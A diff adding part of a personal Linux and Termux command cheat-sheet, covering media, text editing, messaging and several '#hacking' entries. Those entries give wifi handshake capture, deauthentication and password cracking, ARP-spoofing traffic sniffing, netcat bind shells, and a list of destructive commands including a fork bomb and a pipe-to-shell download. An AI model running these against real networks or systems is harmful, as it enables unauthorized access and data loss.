@@ -1,0 +1,1570 @@
+#net
+$ttyd215
+*CONNECT YOUR TERMINAL WITH WEB LOCALLY
+- sudo pacman -Sy ttyd
+[READ ONLY METHOD FOR TEACHING PURPOSES LOCALLY BOTH SYSTEMS CONNECT SAME NETWORK]
+
+- tmux new -s class
+[IN DIFFRENT TERMINAL RUN THIS COMMAND]
+- ttyd -p 8080 tmux attach -t class
+[NOW PASTE THE IP WITH PORT IN YOUR BROWSER AND TYPE ANY THING IN YOUR TMUX TERMINAL IT SHOW IN WEB]
+- IP:8080
+
+[WRIGHTING METHOD FOR WRITE ANY COMMAND IN WEB LOCALLY]
+
+- ttyd -W -p 8080 zsh
+
+
+========================================
+
+#net
+$tty-share216
+*CONNECT YOUR TERMINAL ALL OVER THE WORLD PUBLICALLY
+- yay -S tty-share
+[IF YOU WANT TO RUN IN LOCAL HOST]
+- tty-share
+[IF YOU WANT TO RUN ALL OVER THE WORLD]
+- tty-share --public --readonly --command bash
+IF YOU DON'T WANT READONLY REMOVE THAT LINE
+
+========================================
+
+#images
+$chafa217
+*JPG TO ASCII
+- chafa A.jpg
+- chafa -f symbols --fill all  -c full ~/Downloads/w1.png
+        OR
+- neofetch --chafa A.jpg
+
+========================================
+
+#images
+$jp2a218
+*JPG FOR TERMINAL BANNERS
+- jp2a --color --fill A.jpg
+        OR
+- jp2a --color --fill --grayscale A.jpg
+
+========================================
+
+#web
+$w3m219
+*RUN ANY WEBSITE, PIC, VIDEO IN TERMINAL
+- pacman -S w3m
+- w3m google.com
+[NOW SEARCH -> intitle: "index of" avengers]
+[IT STORES DATA ON /home/.w3m]
+If you want to go back in the website, press ctrl+down
+
+========================================
+
+#ffmpeg
+$merge220
+*MERGE AUDIO FILE USING FFMPEG
+- ffmpeg -i "concat:f1.mp3|f2.mp3" -acodec copy o.mp3
+
+========================================
+
+#ffmpeg
+$split221
+*SPLIT AUDIO FILE USING FFMPEG
+- ffmpeg -i f.mp3 -f segment -segment_time 3 -c copy out%03d.mp3
+[the "3" here = seconds]
+
+========================================
+
+#fancy
+$toilet222
+*TOILET DIFFERENT CMD
+- echo "hi" | toilet --gay --font future
+
+========================================
+
+#fancy
+$ssh223
+*HOW TO SET SSH BANNER
+- micro /etc/ssh/banner
+[CREATE YOUR BANNER USING CHAFA]
+- chafa -f symbols --symbols all -c none fall.png
+- micro /etc/ssh/sshd_config
+[WRITE THIS LINE IN LAST]
+- Banner /etc/ssh/banner
+
+========================================
+
+#hacking
+$proxy224
+*FREE PROXY WEBSITE
+[search in google]
+freeproxylists
+
+========================================
+
+#hacking
+$mac225
+*MAC SPOOFING
+[ACCESS FREE NET / NO ONE BLOCKS YOU FROM INTERNET]
+- ifconfig wlp3s0 down
+- macchanger -m 2C:3B:4D:5E wlp3s0
+[TARGET MAC 2C:3B:4D:5E]
+- ifconfig wlp3s0 up
+[THIS WILL TURN OFF THE WIFI OF THE TARGET]
+
+========================================
+
+#hacking
+$macip226
+*CHANGE YOUR MAC AND IP
+[mac address]
+- ifconfig wlp3s0 hw ether 2C:3B:4D:5E
+[ip address]
+- ifconfig wlp3s0 192.168.1.3
+
+
+========================================
+
+#video
+$mpv227
+*ONLINE STREAM ANY VIDEO AND LISTEN AUDIO IN TERMINAL
+- mpv [youtube link]
+[for video]
+- mpv lol.mp3
+[for audio]
+        OR
+- mplayer [web url video]
+[IT CAN'T OPEN YOUTUBE VIDEO, ONLY OPENS WEBSITE VIDEO]
+- mplayer lol.mp3
+
+========================================
+
+#video
+$mpg228
+*BEST TOOL FOR MUSIC LISTENING IN TERMINAL
+[FIRST OPEN YOUR MUSIC DIRECTORY WHERE YOU SAVE ALL YOUR SONGS]
+- mpg123 -vC *.mp3
+[Press f - for next song]
+[Press d - for previous song]
+[Press H - shows all options]
+
+========================================
+
+#error
+$library229
+*WHEN TERMUX GIVES YOU ERROR IN APT INSTALLING
+- export LD_LIBRARY_PATH=/data/data/com.termux/files/usr/lib/openssl-1.1
+
+========================================
+
+#hacking
+$wififix230
+*FIX SOME WIFI CRACKING ERRORS
+[MONITOR MODE]
+- sudo iw phy phy0 interface add mon0 type monitor
+[IF YOU DON'T KNOW YOUR PHY NAME]
+- iw list
+[SEE IN TOP]
+[HANDSHAKE TIME]
+- airodump-ng --bssid 5C:64:8E:CC:17 -w lol mon0
+[NEVER ADD A CHANNEL TAG IN YOUR COMMAND] [-c 11] 
+[DOS TIME]
+- aireplay-ng --deauth 10 -a 5C:64:8E:CC:17 --ignore-negative-one mon0
+[CRACK TIME]
+- aircrack-ng lol.cap -w pass.txt
+
+========================================
+
+#hacking
+$hashcat231
+*CRACK WIFI PASS WITH HASHCAT
+[FIRST HANDSHAKE THE WIFI WITH AIRODUMP]
+- /usr/lib/hashcat-utils/cap2hccapx.bin lol.cap new-lol.hccapx
+- hashcat -a 0 -m 2500 lol.hccapx pass.txt
+
+========================================
+
+#hacking
+$crunch232
+*HOW TO CREATE A WORD LIST AND CRACK PASS WITH CRUNCH
+- crunch 8 8 -o pass.txt
+[THIS CMD WILL CREATE AN 8-LETTER PASSWORD LIST]
+- crunch 6 6 -t lol1%%
+[%% is used for numbers]
+[THIS CMD WILL CREATE A 6-LETTER PASSWORD LIST, THEY ONLY FOCUS ON %, TRY THIS]
+
+@ = use lower case characters
+, = use upper case characters
+% = use for integer
+^ = use for symbols
+[FOR EX: crunch 6 6 -t Ba@,%^]
+
+
+NOW START CRACKING
+
+- crunch 6 6 -t Ba@,%^ | aircrack-ng -w - lol.cap -e Redmi
+[redmi = wifi name]
+
+========================================
+
+#hacking
+$rainbow233
+*HOW TO CREATE RAINBOW TABLES FOR WIFI CRACKING
+- airolib-ng New-file --import essid essid.txt
+[CREATE YOUR ESSID FILE, ENTER YOUR TARGET WIFI NAME]
+[FOR EX: echo "mx.f" > essid.txt]
+[YOU CAN ADD MORE ESSID IN THE essid.txt FILE]
+- airolib-ng New-file --import passwd pass.txt
+- airolib-ng New-file --batch
+- airolib-ng New-file --verify all
+- airolib-ng New-file --clean all
+- airolib-ng New-file --stat
+- aircrack-ng -r New-file mxf.cap
+[EXTRA CMD]
+- airolib-ng New-file --sql "select * from essid"
+[you can also enter sql queries]
+
+========================================
+
+#hacking
+$hidden234
+*HOW TO CRACK A HIDDEN NETWORK
+- airodump-ng mon0
+[NOW YOU SEE SOME NETWORKS LIKE THIS]
+[BSSID              PWR  Beacon    Data     Enc  ESSID]
+[B0:48:7A:EC        -47    37     5    0   opn  <length: 0>]
+[EVERY HIDDEN NETWORK ESSID SHOWS AS <length: 0>]
+- airodump-ng --bssid 0B:4A:C5 mon0
+- aireplay-ng --deauth 10 -a 0B:4A:C5 -c 4A:AA:BB:CC --ignore-negative-one mon0
+[-c = client]
+[NOW SEE THE airodump-ng TERMINAL, THERE IS AN ESSID COLUMN - THE TOOL CATCHES THE HIDDEN NETWORK'S ESSID]
+[NOW OPEN YOUR ANDROID WIFI SETTINGS, TAP "ADD NETWORK", AND PASTE THE ESSID]
+
+========================================
+
+#hacking
+$arp235
+*HOW TO SHOW CONNECTED DEVICES' MAC WITH ARP
+- arp -a
+[it will show the gateway mac]
+- ping 192.168.1.7 -c 3
+[ 192.168.1.7 = target ip]
+- arp -a
+
+========================================
+
+
+#fancy
+$speech236
+*TEXT TO SPEECH
+- apt install espeak
+- espeak "Hello"
+- espeak -f file.txt
+- espeak -v en-gb "Hello"
+- espeak --voices
+[shows all lists of languages]
+        OR
+- apt install festival
+- echo "Hello" | festival --tts
+- festival --language americanenglish --tts file.txt
+- festival --tts file.txt
+        OR
+- apt install libttspico-utils
+- pico2wave -l en-US -w test.wav "Hello"
+
+========================================
+
+#hacking
+$driftnet237
+*CAPTURE IMAGES, VIDEOS, AUDIO USING SNIFFING
+[if you want to use it normally]
+- driftnet -i wlp3s0
+[now open your firefox and enter this link]
+- https://www.ex-parrot.com/~chris/driftnet
+[if you want to use it for a target]
+- sudo -i
+- echo 1 > /proc/sys/net/ipv4/ip_forward
+        OR
+- sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
+        OR
+- echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+- ping targetip -c 3
+- arp -a
+- arpspoof -i wlp3s0 -t 192.168.1.1 192.168.1.7
+[192.168.1.1=gateway] [192.168.1.7=target ip]
+[open second terminal]
+- arpspoof -i wlp3s0 -t 192.168.1.7 192.168.1.1
+[start both cmds]
+- driftnet -i wlp3s0
+[now open the ex-parrot link]
+
+========================================
+
+#mesg
+$neomutt238
+*HOW TO SEND EMAIL IN LINUX
+[first open your gmail, go to security, and generate your app password]
+[search -> app password]
+- apt install neomutt
+- cd .config; mkdir mutt; cd mutt; touch muttrc
+%muttrc
+%color.muttrc
+
+- neomutt
+========================================
+
+#mesg
+$swaks239
+*SEND EMAIL USING SWAKS
+[first generate an app password in gmail]
+- swaks --to mfsiddiqui716@gmail.com -s smtp.gmail.com:587 -tls -au mohdfaizanrock16@gmail.com -ap your-generated-app-password --from mohdfaizanrock16@gmail.com --data "message"
+[--data points to a file]
+
+========================================
+
+#net
+$netstat240
+*HOW TO SEE THE GATEWAY OF THE INTERNET
+- netstat -nr
+
+========================================
+
+
+#python
+$login241
+*HOW TO CREATE A LOGIN PAGE USING PYTHON
+%login.py
+========================================
+
+#python
+$lines242
+*HOW TO WRITE 2 LINES IN 1 LINE IN PYTHON
+-print("Hello", end=" ")
+-print("lol")
+
+========================================
+
+#python
+$cz243
+*HOW TO WRITE CODE SO CTRL+C OR CTRL+Z DOESN'T WORK IN YOUR SCRIPT
+import signal
+
+def handler(signum, frame):
+    print("", "\r", flush=True)
+    os.system("python file.py")
+
+signal.signal(signal.SIGINT, handler)
+[for ctrl+c]
+signal.signal(signal.SIGTSTP, handler)
+[for ctrl+z]
+
+========================================
+
+#python
+$d244
+*CTRL+D NOT WORKING IN YOUR SCRIPT
+if True:
+    import atexit, os
+    os.system("stty eof ^x")
+    atexit.register(lambda: os.system("stty eof ^D"))
+
+========================================
+
+#hacking
+$metasploit245
+*METASPLOIT BASIC POINTS
+- apt install metasploit-framework
+- msfconsole
+- search sms
+- use exploit/sms
+- show targets
+- show payloads
+- show options
+- show info
+
+========================================
+
+#web
+$root246
+*IF YOU WANT TO RUN ANY WEB RELATED TOOL IN ROOT
+for ex:
+- firefox --allow-root
+- jupyter notebook --allow-root
+
+========================================
+
+#windows
+$reset247
+*RESET WINDOWS USING CMD PROMPT
+- systemreset --factoryreset
+
+========================================
+
+#youtube
+$pytube248
+*DOWNLOAD YOUTUBE VIDEO OR SHORTS USING PYTUBE
+- pip install pytube
+- pytube https://youtube.com/shorts/-QhHAbMGLiy
+
+========================================
+
+#wifi
+$wash249
+*SEE CLEAN WIFI LISTS
+- sudo wash -i mon0
+
+========================================
+
+#hacking
+$ap250
+*HOW TO CREATE RANDOM AP (WIFI)
+- sudo mdk3 mon0 b
+        OR
+- sudo mdk3 mon0 b -m lol
+- sudo mdk3 mon0 b -f wifi.lst
+[enter different names]
+
+========================================
+
+#adaptor
+$apt251
+*HOW TO INSTALL TP-LINK AC600 ADAPTOR DRIVERS
+- apt update && upgrade
+- apt install realtek-rtl88xxau-dkms
+
+========================================
+
+#wifi
+$interface252
+*HOW TO CHANGE YOUR INTERFACE NAME
+- sudo ln -s /dev/null /etc/udev/rules.d/80-net-setup-link.rules
+[This cmd will change your interface name to wlan0 or wlan1 if your name is wlp3s0 or wx bla bla]
+
+========================================
+
+#scan
+$netcat253
+*SCANNING OPEN PORTS USING NETCAT
+- nc -v -w2 -z 192.168.1.7 1-200
+
+========================================
+
+#net
+$dnetcat254
+*DANGEROUS CMD OF NETCAT
+- nc -lp 1234 -e cmd.exe
+[windows]
+- nc -lp 1234 -e /bin/bash
+[linux]
+
+
+========================================
+
+#mesg
+$twiliofirst255
+*HOW TO SEND SMS USING TWILIO
+first login to the twilio site [www.twilio.com]
+ Then it gives you SID, Token and Phone number
+
+[SID = your-twilio-account-sid]
+[TOKEN = your-twilio-auth-token]
+[Phone no = your-twilio-phone-number]
+this is your twilio number
+
+- sudo npm install twilio-cli -g
+- twilio login
+[It will ask your SID, Token, Profile - in profile you can enter any name like mrf]
+
+[FIND TWILIO NO] -> Messaging -> Try it out -> Send SMS -> From Phone Number
+
+- twilio profiles:list
+- twilio profiles:use mrf
+- twilio api:core:messages:create --from "your-twilio-phone-number" --to "recipient-phone-number" --body "Hi"
+
+If you want to add some number in your twilio website to send sms
+[Phone Number -> Manage -> Verified Caller ID]
+
+If you want to send sms to another country then give permission in the website
+[Messaging -> Settings -> Geo Permissions]
+
+========================================
+
+#ffmpeg
+$4k256
+*INCREASE VIDEO QUALITY TO 4K
+- ffmpeg -i l.mp4 -vf scale=3840:2160:flags=neighbor -x 60 -qp 19 -c:a copy o.mp4
+
+========================================
+
+#steg
+$hexedit257
+*HOW TO PROTECT YOUR FILE/VIDEO/PICTURE FROM STRANGERS
+- apt install hexedit
+[Now we can change the file's hex numbers]
+- hexedit vid.mkv
+for ex = (choose any line and add this hex no)
+57 68 69 74 65 63 72 6f 73 73
+[= "WHITECROSS" in ascii, used as a marker]
+[Remember the video's original hex and where you entered the new hex, so you can restore it later]
+
+========================================
+
+#termux
+$image258
+*OPEN IMAGE IN TERMUX
+- termimage lol.jpg
+- termux-open lol.jpg
+
+========================================
+
+#theory
+$cloud259
+*TOP 10 CLOUD STORAGE SITES
+- pcloud - 10GB
+- sync.com - 5GB
+- icedrive - 10GB
+- google drive - 15GB
+- mega - 20GB
+- one drive - 5GB
+- drop box - 2GB
+- work drive - 5GB
+- mediafire - 10GB
+- terabox - 1TB
+
+========================================
+
+#info
+$blackbird260
+*BLACK BIRD - THE RECON TOOL
+- git clone https://github.com/p1ngul1n0/blackbird
+- python blackbird.py -u lol
+        OR
+- python blackbird.py --web
+
+========================================
+
+#cli_tool
+$app261
+*HOW TO SET ANY APP TO OPEN IN TERMINAL
+- cp telegram /usr/bin/
+- ln -s /usr/bin/telegram /usr/bin/tele
+
+
+========================================
+
+#cli_tool
+$eject262
+*HOW TO EJECT USB USING TERMINAL
+- sudo eject /dev/sdb1
+
+========================================
+
+#cli_tool
+$tty263
+*HOW TO OPEN TTY TERMINAL IN LINUX
+- CTRL + ALT + F1
+(How to close)
+- CTRL + ALT + F7
+
+========================================
+
+#windows
+$fast264
+*FAST UP YOUR WINDOWS OS
+first search
+- msconfig
+[Then go to Boot and then Advance option]
+[Check the Number of processors]
+[Then select the maximum processor in your laptop]
+
+========================================
+
+#theory
+$prank265
+*PRANK EXTENSIONS IN CHROME
+- Deletion prank
+This extension removes any link when the user clicks the link on google
+- Hair on screen
+This extension show a hair on the screen
+========================================
+
+#python
+$intresting265
+*PYTHON INTERESTING CMNDS
+(open python in your console)
+
+s = "mrf"
+str = "my name is = %s" %s
+print(str)
+
+num = 66
+m = "my number is = %d" % num
+print(m)
+
+a = "hello"
+print(a[::-1])
+[Reverse the text]
+
+#Odd even
+m = int(input("enter number ="))
+if (m % 2 == 0):
+    print("even")
+else:
+    print("odd")
+
+x = True
+while x:
+    v = input("Enter name here: ")
+    if v == 'q':
+        break
+    else:
+        print("Hello %s" % v)
+
+========================================
+
+#hacking
+$dangerouscmd266
+*TOP DANGEROUS COMMANDS IN LINUX
+
+- sudo rm -rf /
+[This cmd deletes everything in your root directory]
+
+- sudo mv -f / /dev/null
+[This cmd will move all data to a special location in linux known as a BLACK HOLE. As a result, if you accidentally move your data to this folder, it will not be recovered]
+
+- :(){ :|:& };:
+[This cmd freezes the whole system - it's a fork bomb, never run it]
+
+- sudo command > /dev/sda
+[This cmd writes raw data to the specified partition. This causes data loss on the hard drive or specified partition. "command" = this could be any linux command]
+
+- wget http://malicious-source-url -O- | sh
+[This cmd will execute the malicious script in your system]
+
+- mkfs.ext3 /dev/sda
+[This command will erase your hard drive and recreate it]
+
+- dd if=/dev/random of=/dev/sda
+[This command will write random garbage data to your hard drive. Your system will not be recoverable as a result of this command]
+
+- history | sh
+[Because it executes every command that you have already run, from the history]
+[This command can be dangerous - the action may cause system instability and the execution of a command that you do not want to repeat]
+
+- ^mv^rm -f ~/Projects
+[It can also cause problems if you don't thoroughly check the changes you make before running it. The cmd changes the first occurrence of "foo" to "bar"]
+
+========================================
+
+#encryption
+$findhash267
+*FIND ANY HASH AND CIPHERS
+FOR HASH
+- https://www.tunnelsup.com/hash-analyzer/
+FOR CIPHER
+- https://www.dcode.fr/cipher-identifier
+
+========================================
+
+#encryption
+$pikalang268
+*PIKALANG AND BRAINF*CK ENC OR DEC
+- www.dcode.fr/pikalang-language
+        OR
+- www.dcode.fr/brainfuck-language
+
+========================================
+
+#alternative
+$nl269
+*HOW TO SHOW ANY FILE IN A PRETTY WAY
+- nl file.txt
+
+========================================
+
+#cli_tool
+$delete270
+*HOW TO DELETE ANY FILE PERMANENTLY
+["rm" cmd only deletes a file's entry in the system - these files can easily be recovered, but the shred cmd deletes files permanently]
+- shred l.txt
+[This cmd overwrites the contents of the file multiple times to make it unrecoverable]
+- shred -n 10 -v l.txt
+[This cmd changes the number of times a file is overwritten]
+- shred -v l.txt
+[To overwrite and delete a file as well]
+- shred -s 5 l.txt
+[To overwrite only some specific bytes of the file]
+- shred -z l.txt
+[To add a final overwrite with zeros, to hide the shredding]
+
+========================================
+
+#info
+$stat271
+*HOW TO SEE ANY FILE OR DIRECTORY IN STAT FORM
+- stat lol.txt
+
+========================================
+
+#info
+$human272
+*HOW TO SEE FILE SIZE IN LINUX IN HUMAN-READABLE FORM
+- ls -hs lol.txt
+- du -h lolo.txt
+
+========================================
+
+#user
+$owner273
+*HOW TO CHANGE OWNER OF FILE AND DIRECTORIES
+- chown -R root:root lol.txt
+- chown -R mrf:mrf lol.txt
+(Try this in your desktop folder)
+
+========================================
+
+#wifi
+$5ghz274
+*HOW TO SCAN ONLY 5GHZ WIFI NETWORKS
+- sudo airodump-ng --band a wlan0
+
+========================================
+
+#cli_tool
+$snap275
+*HOW TO INSTALL ANY SOFTWARE AND GAMES IN LINUX
+(first install snap)
+- sudo apt install snapd
+(Now open your browser and search)
+- snapcraft.io
+(search any game or software on this website)
+- sudo snap install mario0
+        OR
+- sudo snap install telegram-desktop
+(show installed software list in snap)
+- sudo snap list
+(remove software in snap)
+- sudo snap remove mario0
+
+========================================
+
+#steg
+$addhex276
+*EDIT OR ADD HEX FILE
+(for edit)
+- Hexcurse file
+(for add hex)
+- bless file
+
+========================================
+
+#fancy
+$weather277
+*CHECK WEATHER OF ANY STATE USING CURL
+- curl http://wttr.in/delhi
+
+========================================
+
+#fancy
+$star278
+*STAR WARS MOVIE IN LINUX
+- telnet towel.blinkenlights.nl
+
+========================================
+
+#hardware
+$cpu279
+*SHOW CPU INFO IN LINUX
+- sudo lshw -C cpu
+        OR
+- cat /proc/cpuinfo
+
+========================================
+
+#encryption
+$protect280
+*HOW TO PASSWORD-PROTECT A FILE IN LINUX
+- apt install gnupg
+- gpg -c --cipher-algo AES256 ./t.txt
+(for unlocking the file)
+- gpg t.txt.gpg
+
+========================================
+
+#theory
+$movies281
+*BEST SITES FOR MOVIES
+- fmovies.com
+- uniquestream.net
+-hdmovie2.bond
+-hdmovies4u.space
+-primewire.today
+-vegamovies.monster
+-0see.im
+
+
+========================================
+
+#info
+$track282
+*TRACK DATA IN LINUX
+-vmstat
+        OR
+-ifstat
+        OR
+-vmstat -vs -o a.png
+-watch -n 5 --differences vmstat -d
+
+========================================
+
+#cli_tool
+$caches283
+*HOW TO REMOVE CACHES IN LINUX
+-sudo -i
+-sync; echo 1 > /proc/sys/vm/drop_caches
+-sync; echo 2 > /proc/sys/vm/drop_caches
+-sync; echo 3 > /proc/sys/vm/drop_caches
+
+========================================
+
+#hardware
+$vmstat284
+*HOW SHOW HARDWARE INFO IN STAT FORM
+-vmstat OR iostat
+
+========================================
+
+#hardware
+$free285
+*SHOW STORAGE INFO
+-free -m
+
+========================================
+
+#cli_tool
+$hex286
+*RUN ANY LINUX CMD IN HEX FORM
+-echo -n "ls" | od -A n -t x1
+[THIS CMD CONVERTS YOUR STRING INTO HEX]
+string = ls
+HEX = 6c 73
+-eval $'\x6c\x73'
+
+========================================
+
+#youtube
+$ytfzf287
+*YOUTUBE IN TERMINAL
+-sudo apt install curl git mpv jq fzf yt-dlp
+-apt install ytfzf
+-ytfzf
+
+========================================
+
+#cli_tool
+$list288
+*HOW TO INSTALL LIST MANAGER IN LINUX
+-brew install ultralist
+-ultralist init
+-ultralist add lool
+[FOR ADDING A LIST]
+-ultralist an 1 I am lool
+[FOR ADDING A NOTE IN LIST 1]
+-ultralist list
+[IT SHOW ALL THE LISTS]
+-ultralist list --notes
+[IT SHOW LIST + NOTES]
+-ultralist d 1
+[IT DELETE THE LIST 1]
+-ultralist c 1
+[IT TICK MARK THE LIST AS COMPLETED]
+-ultralist uc 1
+[IT SHOW THE TASK IS INCOMPLETED]
+-ultralist e 1 pot
+[IT EDIT LOOL TO POT]
+        OR
+-apt install topydo
+-topydo add item_1
+-topydo ls
+
+========================================
+
+#hardware
+$motherboard289
+*MOTHERBOARD INFO IN LINUX
+-sudo dmidecode
+
+========================================
+
+#math
+$percentage290
+*HOW TO CALCULATE MARKS PERCENTAGE USING CALCULATOR
+-590 / 1050 x 100
+[590=YOUR MARKS / 1050=TOTAL MARKS]
+        OR
+-59000 / 1050
+
+========================================
+
+#theory
+$mixkit291
+*BEST BACKGROUND SOUNDS WEBSITE
+-https://mixkit.co/free-sound-effects/-
+
+========================================
+
+#info
+$ltrace292
+*TRACE THE COMMAND PROCESS
+-ltrace pwd
+
+========================================
+
+#info
+$elf293
+*ELF FILE INFORMATION
+-readelf -h /bin/pwd
+        OR
+-readelf -a /bin/cat
+
+========================================
+
+#steg
+$decodedtmf294
+*DECODE DTMF USING GITHUB TOOL
+-git clone https://github.com/ribt/dtmf-decoder.git
+-sudo python3 -m pip install -r requirements.txt --upgrade
+
+========================================
+
+#convert
+$bdhac295
+*BINARY, DECIMAL, HEXADECIMAL, ASCII CONVERTER
+--b2d - Binary to decimal
+--b2h - Binary to hexadecimal
+--b2a - Binary to ASCII
+--d2b - Decimal to binary
+--d2h - Decimal to hexadecimal
+--d2a - Decimal to ASCII
+--h2b - Hexadecimal to binary
+--h2d - Hexadecimal to decimal
+--h2a - Hexadecimal to ASCII
+--a2b - ASCII to binary
+--a2d - ASCII to decimal
+--a2h - ASCII to hexadecimal
+-bindechexascii --b2a 1000 111
+
+========================================
+
+#steg
+$extracthex296
+*HOW TO EXTRACT HEX IN ANY FILE
+-od -An -vtx1 old.txt > new.txt
+
+========================================
+
+#clieditor
+$replace297
+*REPLACE TXT IN ANY FILE IN LINUX
+[CHANGE 20 TO 0]
+-sed -i 's/20/0/g' my.txt
+[CHANGE L TO SPACE]
+-sed -i 's/L//g' my.txt
+
+========================================
+
+#clieditor
+$remove298
+*REMOVE USELESS OR EXTRA SPACES IN LINUX
+-tr -s " " < my.txt > new.txt
+        OR
+-sed -e 's/\s\+//g' my.txt > new.txt
+
+========================================
+
+#convert
+$bs299
+*BINARY TO STRING IN LINUX
+[FOR SINGLE BINARY]
+-echo "1011011" | perl -lape '$_=pack"(B8)*", @F'
+[FOR FILE]
+-cal b.txt | perl -lape '$_=pack"(B8)*", @F'
+
+========================================
+
+#clieditor
+$backn300
+*HOW TO REMOVE \n IN ANY FILE
+-tr -d "\n" < old.txt > new.txt
+
+========================================
+
+#clieditor
+$space301
+*HOW GIVE SPACE EACH ON EVERY LETTER
+-awk '$1=$1' FS= OFS=" " < o.txt > new.txt
+
+========================================
+
+#clieditor
+$8space302
+*HOW TO GIVE SPACE AFTER EVERY 8 CHARACTERS
+-sed 's/.\{8\}/& /g' < o.txt > p.txt
+
+[YOU CAN USE THIS FOR BINARY]
+
+========================================
+
+#cli_tool
+$format303
+*HOW TO FORMAT YOUR USB IN LINUX
+-sudo fdisk -l
+-sudo mkfs.vfat /dev/sdb1
+        OR
+-sudo mkfs.exfat /dev/sdb1
+        OR
+-sudo mkfs.ntfs /dev/sdb1
+
+========================================
+
+#cli_tool
+$random304
+*HOW TO ADD RANDOM DATA IN YOUR DRIVE
+[IF YOU RUN THIS PROCESS KNOW ONE RECOVER YOUR DATA.]
+-sudo fdisk -l
+-dd if=/dev/urandom of=/dev/sdb1 bs=10M
+
+========================================
+
+#theory
+$zty305
+*HOW TO IMPROVE YOUR TYPING SPEED WITH PLAYING GAME
+open your google and go to this website
+-zty.pe
+
+========================================
+
+#mesg
+$toxic306
+*TEXT, CALL AND SEND FILES IN TERMINAL USING TOXIC
+[1) FOR TEXTING]
+[USER1]
+-/myid
+[NOW SEND YOUR ID TO USER2]
+
+[USER 2]
+-/add abc123>ID
+[THIS CMD SENDS REQUEST TO THAT ID]
+
+[USER 1]
+-/accept 0
+-ctrl + o
+-/log on
+[NOW BOTH OF YOU START TEXTING EACH OTHER]
+
+
+[2) FILE SENDING]
+[USER 1]
+-/sendfile <path>
+
+[USER 2]
+-/savefile <id>
+
+
+[3) GROUP]
+[USER 1]
+-/conference text
+[FOR CREATING GRP]
+-/title hack
+[CHANGE THE GRP NAME]
+[NOW GO TO YOUR FRND INBOX AND INVITE HIM]
+-/invite 0
+-/nick whitex
+[CHANGE YOUR NAME]
+[USER 2]
+-/join
+
+
+[4) CALLING]
+[GO TO YOUR FRND INBOX]
+[USER 1]
+-/call
+[USER 2]
+-/receive
+
+========================================
+
+#mesg
+$irssi307
+*TEXT IN TERMINAL WITH IRSSI
+-irssi --connect irc.libera.chat
+-/nick lol
+-/join #hacking
+[SAME STEPS FOR USER2]
+
+========================================
+
+#steg
+$hexeditor308
+*HIDE SECRET TEXT IN IMG USING HEX EDITOR
+[FOR EXAMPLE YOUR IMAGE SIZE IS 1080X2400]
+[CHECK YOUR IMAGE SIZE WITH EXIFTOOL]
+[NOW CONVERT YOUR IMG SIZE DECIMAL TO HEX]
+-bindechexascii --d2h 1080
+[decimal / hex]
+  1080 = 0960
+  2400 = 0438
+
+[NOW OPEN YOUR IMG USING HEXEDITOR]
+-hexedit lol.jpg
+-ctrl+s
+[FOR SEARCHING]
+[SEARCH 0960 0438 NOW CHANGE 0438 TO 0960]
+[NOW YOUR SIZE IS 1080X1080 = 0960X0960]
+                    [decimal / HEX]
+[NOW OPEN YOUR IMG YOU SEE THE BLANK PAGE DOWNSIDE NOW ENTER ANY SECRET MESSAGE AND EDIT COLOR, TEXT, DESIGN USING GIMP]
+[AFTER TYPE YOUR SECRET MESSAGE CHANGE YOUR SIZE TO NORMAL 1080X2400]
+
+========================================
+
+#steg
+$hex2309
+*HIDE SECRET TXT IN TXT FILE USING HEX
+[FIRST CHOOSE ANY 4 HEX NUMBERS I CHOOSE :]
+ff  d8  a0  e2
+My secret msg = lol
+[CONVERT YOUR SECRET MSG TO BINARY]
+lol = 01101100 01101111 01101100
+        l         o        l
+ff = 0
+d8 = 1
+a0 = t
+e2 = r
+[NOW OPEN YOUR TXT EDITOR - 16 LETTER IN EACH LINE]
+01tr1011trrt00tr
+trrt011rt011tr11
+011trrt011rt00rt
+[NOW REPLACE 0 WITH ff, 1 WITH d8, t WITH a0, r WITH e2]
+[NOW COPY ALL HEX AND PASTE IT INTO YOUR EMPTY TXT FILE USING HEXEDIT]
+[WHEN YOU EXTRACT YOUR FILE REPLACE a0 TO SPACE, e2 TO SPACE]
+
+========================================
+
+#steg
+$stegoveritas310
+*HOW TO EXTRACT ALL TYPE OF DATA FROM IMG FILE
+-pip3 install stegoveritas
+-stegoveritas lol.jpg
+
+========================================
+
+#mesg
+$weechat311
+*HOW TO TALK IN TERMINAL WITH WEECHAT
+-apt install weechat
+-/server add mrf irc.libera.chat
+-/connect mrf
+-/join #x_grp
+
+========================================
+
+#clieditor
+$startend312
+*WRIGHT ANY THING IN STARTING AND ENDING OF ALL LINES
+[FOR STARTING]
+[L.txt]
+Cat
+Dog
+-sed -i 's/^/HELLO/' L.txt
+[FOR ENDING]
+-sed -i 's/$/BY/' L.txt
+
+output=>
+HELLOCATBY
+HELLODOGBY
+
+========================================
+
+#youtube
+$tor2313
+*INSTALL ANY TORRENT FILES IN LINUX [PART 2]
+-apt install rtorrent
+-rtorrent garuda.iso.torrent
+or
+-pacman -Sy transmission-cli
+-transmission-cli g.torrent
+        OR
+-brew doctor
+-brew install webtorrent-cli
+-webtorrent g.torrent
+[COLOURFULL]
+
+========================================
+
+#encryption
+$morse314
+*TEXT TO MORSE IN LINUX
+-apt install morsegen
+-echo "Hello" | morsegen -
+
+
+========================================
+
+#adaptor
+$pacman315
+*HOW TO INSTALL TP-LINK ADAPTOR DRIVERS IN ARCH
+-sudo pacman -S pciutils usbutils
+-pacman -Sy yay
+-yay -S rtl8821au-dkms-git
+
+========================================
+
+#arch
+$batstatus316
+*HOW TO CHECK BATTERY STATUS IN TERMINAL
+-cat /sys/class/power_supply/BAT0/capacity
+        OR
+-apt install acpi
+-acpi -b
+
+
+========================================
+
+#clieditor
+$manager317
+*CLI FILE MANAGER
+-apt install mc
+-mc
+        OR
+-pacman -Sy mmm
+-mmm
+        OR
+-pacman -Sy ranger
+-ranger
+        OR
+-pacman -Sy fff
+-fff
+        OR
+-pacman -Sy vifm
+-vifm
+        OR
+-yay -Sy cfiles
+-cfiles
+        OR
+-yay -Sy lfm
+-lfm
+        OR
+-pip install lfm
+        OR
+-pacman -Sy lf
+-lf
+
+
+========================================
+
+#cli_tool
+$snapa318
+*HOW TO INSTALL SNAP IN ARCH
+-sudo apt update
+-git clone https://aur.archlinux.org/snapd.git
+-cd snapd
+-makepkg -si
+-sudo systemctl enable --now snapd.socket
+-sudo ln -s /var/lib/snapd/snap /snap
+-sudo snap install hello-world
+
+========================================
+
+
+#encryption
+$xor319
+*ENCRYPT DECRYPT XOR
+[IN ARCH]
